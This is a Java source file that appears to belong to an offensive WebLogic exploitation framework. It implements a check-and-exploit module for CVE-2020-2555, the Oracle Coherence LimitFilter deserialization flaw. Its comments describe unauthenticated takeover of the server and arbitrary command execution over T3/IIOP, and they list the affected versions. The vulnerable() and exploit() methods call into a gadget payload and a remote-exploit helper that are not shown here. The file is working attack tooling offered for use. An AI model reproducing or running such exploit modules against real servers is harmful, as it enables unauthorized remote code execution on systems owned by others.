/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.vuls.impl;

import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.annotation.Versions;
import com.r4v3zn.weblogic.framework.entity.VulCheckParam;
import com.r4v3zn.weblogic.framework.gadget.impl.LimitFilterGadget;
import com.r4v3zn.weblogic.framework.utils.PayloadUtils;
import com.r4v3zn.weblogic.framework.utils.VulUtils;
import com.r4v3zn.weblogic.framework.vuls.VulTest;

import javax.naming.Context;

/**
 * Title: CVE-2020-2555
 * Desc:
 * <p>
 *     CVE-2020-2555
 *     Oracle Fusion 中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造 T3、IIOP 协议请求，获取 Weblogic 服务器权限，执行任意命令。
 *     该漏洞主要是因为 com.tangosol.util.filter.LimitFilter#toString 触发。
 *     漏洞影响版本:
 *     Oracle Coherence 3.7.1.17
 *     Oracle Coherence & Weblogic 12.1.3.0.0
 *     Oracle Coherence & Weblogic 12.2.1.3.0
 *     Oracle Coherence & Weblogic 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2555
 *     paper: https://www.r4v3zn.com/posts/975312a1/
 * </p>
 * Date:2020/3/31 21:31
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":coherence"})
@Versions({"12.2.1.0.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
public class CVE_2020_2555 implements VulTest{

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] VUL_DEPENDENCIES = new String[]{"coherence.jar"};

    /**
     * 漏洞影响版本
     */
    public static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.0", "12.2.1.0.0", "12.2.1.2.0", "12.2.1.2.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bindName
     */
    private String bindName = "";

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param vulCheckParam 漏洞校验额外参数
     * @return
     * @throws Exception
     */
    public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception {
        return PayloadUtils.baseVulnerable(url, LimitFilterGadget.class, this, vulCheckParam);
    }

    /**
     * 漏洞利用
     *
     * @param url
     * @param param
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }
}
